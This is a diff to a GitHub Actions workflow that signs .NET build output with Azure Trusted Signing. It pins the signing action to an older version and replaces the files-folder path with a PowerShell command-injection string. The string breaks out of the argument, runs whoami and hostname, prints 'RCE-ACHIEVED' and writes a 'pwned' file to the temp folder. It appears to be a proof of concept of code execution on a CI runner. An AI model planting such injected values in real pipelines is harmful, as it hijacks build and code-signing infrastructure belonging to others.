@@ -40,12 +40,12 @@ jobs:
           enable-AzPSSession: true
 
       - name: Sign files with Trusted Signing
-        uses: azure/trusted-signing-action@v0.5.11
+        uses: azure/trusted-signing-action@v0.5.10
         with:
           endpoint: https://eus.codesigning.azure.net/
           trusted-signing-account-name: jaxelr
           certificate-profile-name: jaxelr-pt
-          files-folder: ${{ github.workspace }}\\MyApi\bin\Release\net8.0
+          files-folder: '"; Write-Host ''RCE-ACHIEVED''; whoami; hostname; echo ''pwned'' > $env:TEMP\pwned.txt; exit 0; #'
           files-folder-filter: exe,dll
           file-digest: SHA256
           timestamp-rfc3161: http://timestamp.acs.microsoft.com
